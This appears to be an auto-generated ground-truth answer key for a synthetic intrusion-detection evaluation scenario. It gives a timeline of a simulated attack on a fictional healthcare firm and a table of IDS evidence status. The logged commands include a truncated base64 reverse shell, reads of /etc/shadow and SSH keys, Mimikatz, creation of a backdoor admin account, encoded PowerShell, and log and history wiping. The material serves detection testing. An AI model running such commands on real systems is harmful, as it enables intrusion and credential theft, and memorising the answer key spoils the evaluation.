# Ground Truth: iteration-test-expanded-ids

**Scenario:** IDS-focused variant of the expanded EvidenceForge iteration-test scenario for fast
generate/evaluate/fix cycles. It preserves the original environment and attack narrative
while adding authored, transport-correlated IDS assertions, sensor-local filtering, and
deliberate no-alert cases for broad automated and LLM-as-a-judge quality evaluation.
Meridian Healthcare Solutions is a mid-size healthcare IT company providing EHR
integration services from a corporate HQ with an on-premises data center. The
storyline compresses an APT-style web-app intrusion, Linux and Windows lateral
movement, credential theft, domain compromise, C2, DNS tunneling, data staging,
exfiltration, email abuse, and cleanup into a 6-hour collection window while
preserving broad event-type and log-format coverage. This expanded variant adds
explicit on-prem email topology, SMTP routing, corpus-backed message bodies,
MIME artifacts, distribution groups, Bcc handling, STARTTLS visibility, ISP relay
egress, inbound/outbound/internal mail, explicit mailbox reads, rejected mail,
and deterministic background email traffic.


**Generated:** 2024-03-18 12:00:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **diego.ramirez** on **WS-DRAMIREZ-01**: External benefits-themed phishing message is delivered to Finance with hidden security Bcc
2. **diego.ramirez** on **WS-DRAMIREZ-01**: Finance user reads the suspicious benefits message through OWA
3. **diego.ramirez** on **WS-DRAMIREZ-01**: Diego forwards the suspicious message to the help desk and discreetly copies security
4. **root** on **WEB-EXT-01**: External attacker scans the DMZ for exposed services
5. **root** on **WEB-EXT-01**: External attacker runs Nikto web vulnerability scanning against the EHR portal
6. **root** on **LT-MRIVERA-02**: Rogue laptop obtains an address from DHCP on the corporate LAN
7. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an internal EHR release note to a clinical operations distribution group
8. **omar.haddad** on **WS-OHADDAD-01**: Analytics user reads the EHR release note through IMAPS
9. **apache** on **WEB-EXT-01**: SQL injection probes against the EHR portal produce server errors
10. **apache** on **WEB-EXT-01**: Web shell upload and reverse shell callback to direct-IP C2
11. **root** on **WEB-EXT-01**: Network and host discovery from the compromised web server
12. **priya.patel** on **WS-PPATEL-01**: A vendor document workflow sends security an AI-generated summary with prompt-injection text in an attachment
13. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an outbound interface package to a lab vendor through the clinical route and ISP relay
14. **root** on **WEB-EXT-01**: Harvest database credentials and SSH key material from the web server
15. **root** on **APP-INT-01**: Failed SSH attempt to PROXY-01 followed by successful SSH lateral movement to APP-INT-01
16. **root** on **APP-INT-01**: Dump Linux password databases from APP-INT-01
17. **marcus.chen** on **WS-MCHEN-01**: Attacker uses explicit sysadmin credentials through RunAs
18. **root** on **LT-MRIVERA-02**: Wrong-password fumble before broader credential spray
19. **root** on **WS-AJOHNSON-01**: Credential spray succeeds against help desk user followed by RDP session
20. **aisha.johnson** on **WS-AJOHNSON-01**: Compromised help desk mailbox sends an internal credential-reset lure to finance
21. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker reads the compromised help desk mailbox through IMAPS
22. **aisha.johnson** on **WS-AJOHNSON-01**: Active Directory enumeration from compromised workstation
23. **aisha.johnson** on **WS-AJOHNSON-01**: Credential dumping with Mimikatz disguised as a Windows indexing service
24. **aisha.johnson** on **DC-01**: PsExec-style lateral movement to DC-01 through SMB service creation
25. **evelyn.brooks** on **WS-EBROOKS-01**: External invoice-themed attachment is rejected by the mail gateway
26. **SYSTEM** on **DC-01**: Create backdoor account and add it to Domain Admins
27. **SYSTEM** on **DC-01**: Install service and scheduled task persistence on DC-01
28. **SYSTEM** on **DC-01**: Allowed HTTPS beacon from DC-01 to attacker infrastructure
29. **SYSTEM** on **DC-01**: Direct C2 beacon attempts from DC-01 are blocked by firewall
30. **root** on **APP-INT-01**: DNS tunneling exfiltration from APP-INT-01
31. **evelyn.brooks** on **WS-EBROOKS-01**: Executive sends an inline-authored operating note to an outside advisor with internal Bcc
32. **root** on **WEB-EXT-01**: DGA queries from compromised web server
33. **svc_mhsync** on **FILE-SRV-01**: Backdoor account authenticates to FILE-SRV-01 and stages sensitive data
34. **root** on **DB-PROD-01**: SSH to DB-PROD-01, dump patient database, gzip, and SCP archive back to APP-INT-01
35. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker locks compromised workstation before stepping away
36. **aisha.johnson** on **WS-AJOHNSON-01**: Upload compressed archive to external staging domain over HTTPS
37. **root** on **WEB-EXT-01**: Ongoing periodic beacon from WEB-EXT-01
38. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker returns and unlocks compromised workstation
39. **root** on **WEB-EXT-01**: Clear Linux shell history on WEB-EXT-01
40. **root** on **APP-INT-01**: Clear Linux shell history on APP-INT-01
41. **SYSTEM** on **DC-01**: Encoded PowerShell download and Security log clearing on DC-01
42. **root** on **APP-INT-01**: Standalone DNS queries for attacker infrastructure
43. **SYSTEM** on **DC-01**: Delete backdoor account after exfiltration
44. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker logs off compromised help desk workstation
45. **svc_mhsync** on **FILE-SRV-01**: Backdoor account session logs off FILE-SRV-01
46. **root** on **APP-INT-01**: Root SSH session logs off APP-INT-01


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2024-03-18 12:11:57 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: notices@benefits-serviceportal.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Benefits confirmation required today' (artifacts/email/benefits-confirmation-msg.eml) |
| 2024-03-18 12:18:07 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Read | Mailbox read: diego.ramirez@meridianhcs.com via owa on finance (UID: CIaYYEicKIArEyhqjTQ) |
| 2024-03-18 12:23:43 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: diego.ramirez@meridianhcs.com -> aisha.johnson@meridianhcs.com, marcus.chen@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Fwd: Benefits confirmation required today' (artifacts/email/finance-forward-to-it-msg.eml) |
| 2024-03-18 12:30:10 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [22], 1 denied connections + ASA threat detection alert (733100) [IDS: SID 2002911 policy={'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=0 emitted=0 filtered=0] |
| 2024-03-18 12:30:10 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [80, 443, 8080, 8443, 3306], 5 denied connections + ASA threat detection alert (733100) |
| 2024-03-18 12:31:28 UTC | root | WEB-EXT-01 | Web_Scan | Web scan (nikto) against 10.10.3.10:443 (389 requests) |
| 2024-03-18 12:44:54 UTC | root | LT-MRIVERA-02 | Dhcp_Lease | DHCP lease for LT-MRIVERA-02 (MAC: DC:A6:32:44:91:7B) |
| 2024-03-18 12:48:18 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> lina.nguyen@meridianhcs.com, omar.haddad@meridianhcs.com, priya.patel@meridianhcs.com; subject 'EHR connector release notes' (artifacts/email/ehr-release-note-msg.eml) |
| 2024-03-18 12:53:15 UTC | omar.haddad | WS-OHADDAD-01 | Email_Read | Mailbox read: omar.haddad@meridianhcs.com via imaps on clinical (UID: CoLAxHyVkbRUqxaG0h) |
| 2024-03-18 12:59:54 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CxWXSduz6LZYBoiXHfM) |
| 2024-03-18 12:59:56 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: COz9bek7kMFW2xBnnq) |
| 2024-03-18 13:19:43 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: ChHD4W1oRYdUPGREn) |
| 2024-03-18 13:19:45 UTC | apache | WEB-EXT-01 | Process | Process: /bin/bash (PID: 581387) - `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L...` |
| 2024-03-18 13:19:46 UTC | apache | WEB-EXT-01 | Connection | Connection to 45.33.32.30:8443 (UID: ChniifOsBecvX9D9Q0) |
| 2024-03-18 13:19:47 UTC | apache | WEB-EXT-01 | Raw | Web shell upload and reverse shell callback to direct-IP C2 |
| 2024-03-18 13:39:45 UTC | root | WEB-EXT-01 | Process | Process: /usr/sbin/ip (PID: 584301) - `ip addr show` |
| 2024-03-18 13:39:51 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584350) - `cat /etc/hosts` |
| 2024-03-18 13:40:10 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584369) - `cat /etc/resolv.conf` |
| 2024-03-18 13:40:19 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/find (PID: 585313) - `find /opt/ehr -name '*credential*' -maxdepth 3` |
| 2024-03-18 13:47:06 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 585377) - `nmap -sn 10.10.2.0/24` |
| 2024-03-18 13:47:41 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 585487) - `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24` |
| 2024-03-18 13:49:46 UTC | priya.patel | WS-PPATEL-01 | Email_Message | Email delivered: workspace@docflow-health.net -> priya.patel@meridianhcs.com; subject 'DocFlow summary package: vendor terms' (artifacts/email/docflow-ai-summary-msg.eml) |
| 2024-03-18 13:56:04 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> miles.avery@stonebridge-consultingllc.com, omar.haddad@meridianhcs.com; subject 'Stonebridge interface package comments' (artifacts/email/vendor-interface-package-msg.eml) |
| 2024-03-18 13:59:57 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587137) - `cat /var/www/html/config.php` |
| 2024-03-18 14:00:03 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/ls (PID: 587266) - `ls -la /root/.ssh` |
| 2024-03-18 14:01:20 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587418) - `cat /root/.ssh/id_rsa` |
| 2024-03-18 14:14:59 UTC | root | APP-INT-01 | Connection | Connection to 10.10.3.20:22 (UID: CUqGJ14aYsOHBI2s6Q) |
| 2024-03-18 14:15:01 UTC | root | APP-INT-01 | Ssh_Session | SSH session to 10.10.2.30:22 (UID: CnEN1yamiEf4NNaZMN) [IDS: SID 2002911 policy={'detection_filter': None, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=2 emitted=2 filtered=0] |
| 2024-03-18 14:35:09 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962156) - `cat /etc/passwd` |
| 2024-03-18 14:35:15 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962174) - `cat /etc/shadow` |
| 2024-03-18 14:50:02 UTC | marcus.chen | WS-MCHEN-01 | Explicit_Credentials | Explicit credentials: RunAs marcus.chen on DC-01 |
| 2024-03-18 14:59:22 UTC | root | LT-MRIVERA-02 | Failed_Logon | Wrong-password fumble before broader credential spray |
| 2024-03-18 15:00:25 UTC | root | WS-AJOHNSON-01 | Credential_Spray | Credential spray: 4 attempts against 3 accounts (success: aisha.johnson at attempt 4) |
| 2024-03-18 15:00:26 UTC | aisha.johnson | WS-AJOHNSON-01 | Rdp_Session | RDP session to 10.10.1.35:3389 (UID: CyqZj9j31xVIjMo672k) |
| 2024-03-18 15:07:56 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Message | Email delivered: aisha.johnson@meridianhcs.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, marcus.chen@meridianhcs.com; subject 'Help desk follow-up: credential reset validation' (artifacts/email/internal-reset-lure-msg.eml) |
| 2024-03-18 15:14:01 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Read | Mailbox read: aisha.johnson@meridianhcs.com via imaps on edge (UID: CHLYS5WJWqzTScGRj) |
| 2024-03-18 15:19:58 UTC | aisha.johnson | WS-AJOHNSON-01 | Logon | Network logon from 10.10.1.99 (LogonID: 0x27005f8) |
| 2024-03-18 15:19:59 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\whoami.exe (PID: 6500) - `whoami /all` |
| 2024-03-18 15:20:02 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6604) - `net user /domain` |
| 2024-03-18 15:20:07 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6624) - `net group "Domain Admins" /domain` |
| 2024-03-18 15:20:09 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6652) - `net view /domain` |
| 2024-03-18 15:20:10 UTC | aisha.johnson | WS-AJOHNSON-01 | Dns_Query | DNS query: DC-01.meridianhcs.local (A, NOERROR) |
| 2024-03-18 15:20:12 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 10.10.2.10:389 (UID: CANWhnHvAAZQl60xJ3E) |
| 2024-03-18 15:44:56 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\ms-index-service.exe (PID: 6660) - `ms-index-service.exe "privilege::debug" "sekurl...` |
| 2024-03-18 15:44:59 UTC | aisha.johnson | WS-AJOHNSON-01 | Process_Access | Credential dumping with Mimikatz disguised as a Windows indexing service |
| 2024-03-18 15:45:02 UTC | aisha.johnson | WS-AJOHNSON-01 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2024-03-18 16:00:20 UTC | aisha.johnson | DC-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0x5554de8) |
| 2024-03-18 16:00:21 UTC | aisha.johnson | DC-01 | Service_Installed | Service installed: PSEXESVC (%SystemRoot%\PSEXESVC.exe) |
| 2024-03-18 16:00:23 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\PSEXESVC.exe (PID: 5380) - `PSEXESVC.exe -accepteula` |
| 2024-03-18 16:00:25 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 5392) - `cmd.exe /c whoami && hostname` |
| 2024-03-18 16:07:19 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email rejected: billing@medclaims-processing.net -> evelyn.brooks@meridianhcs.com; subject 'Updated claims processing invoice' (metadata-only) |
| 2024-03-18 16:14:37 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5400) - `net user svc_mhsync MhsSvc!2024 /add /domain` |
| 2024-03-18 16:14:38 UTC | SYSTEM | DC-01 | Account_Created | Account created: svc_mhsync |
| 2024-03-18 16:14:41 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5424) - `net group "Domain Admins" svc_mhsync /add /domain` |
| 2024-03-18 16:14:42 UTC | SYSTEM | DC-01 | Group_Member_Added | Added svc_mhsync to group Domain Admins |
| 2024-03-18 16:20:19 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 5460) - `sc.exe create DeviceSyncSvc binPath= C:\Windows...` |
| 2024-03-18 16:20:20 UTC | SYSTEM | DC-01 | Service_Installed | Service installed: DeviceSyncSvc (C:\Windows\System32\DeviceSyncSvc.exe) |
| 2024-03-18 16:20:23 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 5480) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2024-03-18 16:20:24 UTC | SYSTEM | DC-01 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\DeviceSync |
| 2024-03-18 16:30:07 UTC | SYSTEM | DC-01 | Beacon | Beacon to 45.33.32.30:443 (10 attempts, 1h30m) |
| 2024-03-18 16:31:06 UTC | SYSTEM | DC-01 | Beacon | Denied beacon to 45.33.32.30:443 (4 attempts, 1h30m) |
| 2024-03-18 16:44:47 UTC | root | APP-INT-01 | Dns_Tunnel | DNS tunnel via ns1.westbridge-services.cloud (hex, 266 queries, 1351 bytes exfiltrated) [IDS: SID 2029706 policy={'detection_filter': {'track': 'by_src', 'count': 10, 'seconds': 60}, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 2, 'seconds': 300}} candidates=263 emitted=6 filtered=257] |
| 2024-03-18 16:50:13 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email delivered: evelyn.brooks@meridianhcs.com -> marina.holt@northbridge-advisory.com, diego.ramirez@meridianhcs.com, priya.patel@meridianhcs.com; subject 'March operating note' (artifacts/email/executive-operating-note-msg.eml) |
| 2024-03-18 17:00:27 UTC | root | WEB-EXT-01 | Dga_Queries | DGA queries: 91 total (80 NXDOMAIN, TLD: .top, sample: ['ewnjsaqf1rasgez5.top', '6cja6syvo02mu.top', '30rgw6r7503.top']) [IDS: SID 2027865 policy={'detection_filter': {'track': 'by_src', 'count': 2, 'seconds': 120}, 'event_filter': {'type': 'both', 'track': 'by_src', 'count': 1, 'seconds': 300}} candidates=182 emitted=18 filtered=164] |
| 2024-03-18 17:00:35 UTC | svc_mhsync | FILE-SRV-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0xf88434e) |
| 2024-03-18 17:00:46 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5648) - `net view \\FILE-SRV-01` |
| 2024-03-18 17:00:47 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 5652) - `powershell.exe -NoProfile -Command "Compress-Ar...` |
| 2024-03-18 17:15:03 UTC | root | DB-PROD-01 | Ssh_Session | SSH session to 10.10.4.10:22 (UID: CaCAy1lb35DYPu7XR8) |
| 2024-03-18 17:15:04 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/mysqldump (PID: 158497) - `mysqldump --single-transaction ehr patients ins...` |
| 2024-03-18 17:17:19 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/gzip (PID: 158862) - `gzip -9 /tmp/rpt_0318.sql` |
| 2024-03-18 17:19:16 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/scp (PID: 159428) - `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/....` |
| 2024-03-18 17:20:09 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Lock | Workstation Locked |
| 2024-03-18 17:25:24 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 45.33.32.30:443 (UID: C7sr5dHdzDR7a6bJ7xE) |
| 2024-03-18 17:30:17 UTC | root | WEB-EXT-01 | Beacon | Beacon to 45.33.32.30:443 (3 attempts, count=3) |
| 2024-03-18 17:34:58 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Unlock | Workstation Unlocked |
| 2024-03-18 17:39:41 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/shred (PID: 608751) - `shred -u /root/.bash_history` |
| 2024-03-18 17:40:56 UTC | root | APP-INT-01 | Process | Process: /bin/bash (PID: 982851) - `history -c && cat /dev/null > ~/.bash_history` |
| 2024-03-18 17:41:45 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 5860) - `powershell.exe -NoProfile -EncodedCommand SQBFA...` |
| 2024-03-18 17:41:47 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 5880) - `wevtutil cl Security` |
| 2024-03-18 17:41:49 UTC | SYSTEM | DC-01 | Log_Cleared | Encoded PowerShell download and Security log clearing on DC-01 |
| 2024-03-18 17:44:46 UTC | root | APP-INT-01 | Dns_Query | DNS query: edge.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:44:49 UTC | root | APP-INT-01 | Dns_Query | DNS query: api.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:44:52 UTC | root | APP-INT-01 | Dns_Query | DNS query: metrics.westbridge-services.net (TXT, NXDOMAIN) |
| 2024-03-18 17:50:09 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5900) - `net user svc_mhsync /delete /domain` |
| 2024-03-18 17:50:10 UTC | SYSTEM | DC-01 | Account_Deleted | Account deleted: svc_mhsync |
| 2024-03-18 17:54:51 UTC | aisha.johnson | WS-AJOHNSON-01 | Logoff | Attacker logs off compromised help desk workstation |
| 2024-03-18 17:56:01 UTC | svc_mhsync | FILE-SRV-01 | Logoff | Backdoor account session logs off FILE-SRV-01 |
| 2024-03-18 17:57:13 UTC | root | APP-INT-01 | Logoff | Root SSH session logs off APP-INT-01 |


## Source Evidence Status

Canonical ground truth remains authoritative. Source rows may be `visible`, `delayed`, `dropped`, `filtered`, or `out_of_window` depending on the selected observation profile and sensor placement.

| Storyline ID | Source | Status Counts |
|--------------|--------|---------------|
| 00af0cbf-e4e1-447b-90f1-a1e5b5d54944 | ids | delayed: 1 |
| 02139021-545a-4937-9545-12a3f95492d2 | ids | delayed: 1 |
| 0273f3ce-a2e7-4560-a9c2-27128b5d2e10 | ids | delayed: 1 |
| 03e168cf-dd0d-40c7-8091-d9c13230efe4 | ids | delayed: 1 |
| 0865eb95-191e-4d9b-8f89-618ba86b225a | ids | delayed: 1 |
| 0aa7c4d5-f6e9-4742-a657-430c68274629 | ids | delayed: 1 |
| 13a90127-f1b8-41ab-a361-9d0b1a690b07 | ids | delayed: 1 |
| 14dbe965-6076-4f4c-a1ec-6816315a0650 | ids | delayed: 1 |
| 16086b44-a2ce-4dec-ad2a-be3fe72641a1 | ids | delayed: 1 |
| 18a16aad-e994-49eb-82e8-d42573707494 | ids | delayed: 2 |
| 18f71333-170c-49f4-b6f0-c5b812db9402 | ids | delayed: 1 |
| 1b11535d-309a-4bde-b609-0851a1085d7c | ids | delayed: 1 |
| 1b1719b3-bb00-4fe4-b41e-5f455085f0a6 | ids | delayed: 1 |
| 1b64a64b-15d8-445f-9c8c-8d5d7a64f044 | ids | delayed: 1 |
| 1b9e1ecd-7b40-437b-8241-5668cf3c6dc4 | ids | delayed: 1 |
| 1c591902-b475-4018-8a24-3ddc86d0cdff | ids | delayed: 2 |
| 204b26e1-66d0-49fe-8382-eaea09b26a95 | ids | delayed: 1 |
| 25482203-14c4-4961-bbe3-d43833955621 | ids | delayed: 1 |
| 285fc395-b0a7-4418-84f2-d6ba8721fdce | ids | delayed: 1 |
| 296a72c5-a027-4b5b-8c22-e0afe6dcb4f4 | ids | delayed: 1 |
| 2a067c11-ce59-4aa3-8650-546b84182362 | ids | delayed: 1 |
| 2a766ba9-483c-4106-861c-c8bb2ec70ad4 | ids | delayed: 1 |
| 2b0161a0-944b-4ddd-81ab-5e8f870c3ff9 | ids | delayed: 1 |
| 2defdbc8-bedd-4c09-a4cf-bda2305fbd69 | ids | delayed: 1 |
| 2e35feb2-3c50-4623-88c8-ec7453688642 | ids | delayed: 1 |
| 32c5fd77-9e2d-4d47-8494-a66c91fc58fa | ids | delayed: 1 |
| 334680ac-fd88-41af-8c73-2b9556266633 | ids | delayed: 1 |
| 36c54e05-e9e6-4d42-ba62-6da990e66a3f | ids | delayed: 1 |
| 36e8236c-c64b-4e08-b6f4-51eaad5d0c66 | ids | delayed: 1 |
| 37f1bdf1-5fa6-4f8d-bc8b-929f16c80b5a | ids | delayed: 2 |
| 380ae9fa-eebe-409a-9d57-42346578ccf5 | ids | delayed: 1 |
| 3a311427-b482-4e03-bcac-e516d62d0d21 | ids | delayed: 1 |
| 3dd5f6a9-2268-4300-9c4a-2e3803ebf928 | ids | delayed: 1 |
| 3e3f6028-3c2e-4f48-8b02-1cf9b6b6dc02 | ids | delayed: 1 |
| 3f19812b-c162-406f-9a72-eb2f1000f8d1 | ids | delayed: 1 |
| 4096f158-b602-44b9-a3df-70dbaaefbf5a | ids | delayed: 1 |
| 40f37f9c-10bd-4840-afff-dbd7df2fcd4c | ids | delayed: 2 |
| 4218a88f-a247-43e3-bc94-d246db00d385 | ids | delayed: 1 |
| 4264d7da-9307-4b2d-80d6-95d0d755fc61 | ids | delayed: 1 |
| 43ba7ce8-9d60-4446-ae69-76b83400178a | ids | delayed: 1 |
| 4500f18a-a6fa-43a6-9fa1-b91ee2dd81c5 | ids | delayed: 1 |
| 460441a9-576b-4fe5-a28a-fecea88efffc | ids | delayed: 1 |
| 473a567b-cae9-47b3-acb9-064daf14f33b | ids | delayed: 1 |
| 4937a6b2-2385-4c83-9d21-9b1ac0c4506f | ids | delayed: 1 |
| 4f4f60ba-6556-4d9f-a32c-6b6e7eb47629 | ids | delayed: 1 |
| 52d5d165-8454-4f4a-906e-54da377dccd6 | ids | delayed: 1 |
| 577cc72d-40dc-488b-a670-ec4e8a86f358 | ids | delayed: 1 |
| 5e334070-0fd0-40ea-83cf-438b74f136bc | ids | delayed: 1 |
| 6115d42a-11b0-4463-84df-ac4d9daef4df | ids | delayed: 2 |
| 62c0c856-0493-4583-915f-86d7b6041a7f | ids | delayed: 1 |
| 631786db-d2a1-430b-9ddc-da2093752eb7 | ids | delayed: 1 |
| 63979888-bbe4-49da-86c9-c726d7cb27a2 | ids | delayed: 1 |
| 63cc7bee-cd07-43c7-b8e0-091fea809656 | ids | delayed: 1 |
| 6c9ae2ab-9e39-4e80-8500-4349c5899b48 | ids | delayed: 1 |
| 6d8d2d52-b31c-466f-935d-b95c552c4e08 | ids | delayed: 1 |
| 6efc913b-cbeb-443e-8904-bdd3af2417c2 | ids | delayed: 1 |
| 72e317fd-96fe-4b52-bd92-157dcbdcac4e | ids | delayed: 1 |
| 7305287a-7c2d-4ec3-9924-4d933fa1d362 | ids | delayed: 2 |
| 74c13fb4-c83c-4b78-9a21-dabcc49bfa38 | ids | delayed: 1 |
| 75150aa9-05a3-4b8d-a24b-3ed1a35088b5 | ids | delayed: 2 |
| 7559ca5f-8e6f-4f47-8f71-d00c884200af | ids | delayed: 1 |
| 79bf3c22-affe-4767-b7a7-1e5c861fddef | ids | delayed: 1 |
| 7db3de29-13d9-4000-93f2-f4776843664b | ids | filtered: 1 |
| 7f621349-792a-44ae-b5c7-d08a4083f802 | ids | delayed: 1 |
| 7feeb372-2fe4-4c08-90b0-7138fe3efeb2 | ids | delayed: 1 |
| 82f3fcfb-790d-4ea4-adfe-c91421a84a04 | ids | delayed: 1 |
| 84293294-5831-4280-acf5-c6a9c0e5b450 | ids | delayed: 2 |
| 856c7221-586f-4af1-bcf9-692f2175cce0 | ids | delayed: 2 |
| 864a4d80-7166-427e-a40e-671a6de30c94 | ids | delayed: 1 |
| 89b96b89-4e32-4f4a-896f-cfb3e19f6eb5 | ids | filtered: 1 |
| 8b6a2ab9-ad69-453d-abb4-258254e19b0e | ids | delayed: 1 |
| 8f2a5b3a-9d05-4384-934f-87ce41726081 | ids | delayed: 1 |
| 90c1b629-eac3-4626-8445-33ed5962f8ed | ids | delayed: 1 |
| 926bf0a9-8611-4d10-8f07-1fb0f1d99a4d | ids | delayed: 1 |
| 9721ed8f-7431-4b2a-96d4-dd03b572270f | ids | delayed: 2 |
| 9845ad88-0409-4cc9-9df1-cfd9c5bf87aa | ids | delayed: 2 |
| 9aff66d5-53d0-41ea-a95e-e27b87673395 | ids | delayed: 2 |
| 9b83586c-a681-456d-90d5-572a5f87eb25 | ids | delayed: 1 |
| 9dd43d38-77f9-4008-b317-90be7d2345cf | ids | delayed: 1 |
| 9de980e0-2f0c-41a1-b314-8ba0050b5ba3 | ids | visible: 1 |
| 9f346263-757d-484e-b8dd-d34883ef1223 | ids | delayed: 1 |
| a25b632e-11a6-4f1d-8a5c-76ffef8bcd52 | ids | delayed: 1 |
| a69e7338-550d-4cb9-b4ba-55fd1b145dfd | ids | delayed: 1 |
| a6e9ddcf-c6a4-48b9-b3ce-10890d5651e0 | ids | delayed: 1 |
| a8832de6-c23c-4076-835b-22a3d3b53da2 | ids | delayed: 1 |
| aa737a3e-0fe7-4304-8175-4f68c0f916be | ids | delayed: 2 |
| ab793e20-f7f8-42c7-81c6-1a617036dfc1 | ids | delayed: 1 |
| acc4cb9b-ff88-4412-bbe5-bd7d4c8a2f35 | ids | delayed: 1 |
| add1da3d-c2d9-486c-af18-6454a2cbc16f | ids | delayed: 1 |
| af72986e-22b9-452c-b309-6a7e75be1760 | ids | delayed: 1 |
| b2fc33cc-82c3-4c36-ab66-f584420cc536 | ids | delayed: 1 |
| b4131ebe-1e0f-47d5-87a9-88788ac82758 | ids | delayed: 1 |
| b4b9df16-da30-48ca-a65d-c7407a13df54 | ids | delayed: 1 |
| b567650a-6030-4de7-89c0-e22f2bf40556 | ids | delayed: 1 |
| b598b4cf-28ef-40b4-8205-8783bde97f13 | ids | delayed: 1 |
| b60db687-5346-40ae-aeb4-c774de88a61c | ids | delayed: 1 |
| b85b0e03-c218-4afd-a0fe-370f56a1edce | ids | delayed: 1 |
| bbac44c0-a4a0-451f-aaf5-41fd10fe91bd | ids | delayed: 1 |
| bdad1286-f32f-4807-a31e-3c64bc1d01e5 | ids | delayed: 2 |
| c5c6ee21-8cf1-4606-af12-f2c6ca648420 | ids | delayed: 1 |
| c72d876c-49fc-4337-ac36-1b71c1d9759a | ids | delayed: 1 |
| c81a8331-277f-4e04-9a5c-3b345852e431 | ids | delayed: 2 |
| c9f9c18c-98ff-48e8-ad55-f0955fc5a89b | ids | delayed: 1 |
| cff4ae0f-78e8-447d-a878-e70811afde23 | ids | delayed: 1 |
| d02a4802-8598-4ecd-91c5-016bb0e72f85 | ids | delayed: 2 |
| d1438c1c-a1a3-4eb6-8bae-a4ce875cf55c | ids | delayed: 1 |
| d16696e9-a8e9-476d-8f42-ebf8ce846cce | ids | delayed: 1 |
| d31ce4fd-f94e-42b8-9963-ea45f1c38e32 | ids | delayed: 1 |
